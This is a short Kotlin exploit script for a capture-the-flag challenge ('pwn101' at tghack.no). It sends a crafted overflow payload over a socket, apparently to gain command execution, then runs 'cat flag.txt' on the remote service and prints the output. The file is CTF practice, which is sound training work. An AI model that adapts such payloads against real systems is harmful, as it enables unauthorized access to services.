import java.io.*
import java.net.Socket

fun main(args: Array<String>) {
    Socket("pwn101.tghack.no", 1060).use  {
        val byteArrayOutput = ByteArrayOutputStream()
        val dataOut = DataOutputStream(byteArrayOutput)
        dataOut.write("aaaaaaaaaaaaaa\\0".toByteArray(Charsets.ISO_8859_1))
        dataOut.writeInt(25 shl 24)
        dataOut.write(1)
        val output = it.getOutputStream()
        output.write(byteArrayOutput.toByteArray())
        output.flush()
        output.write("cat flag.txt\n".toByteArray(Charsets.ISO_8859_1))
        output.flush()
        BufferedReader(InputStreamReader(it.getInputStream())).lines().forEach(System.out::println)
    }
}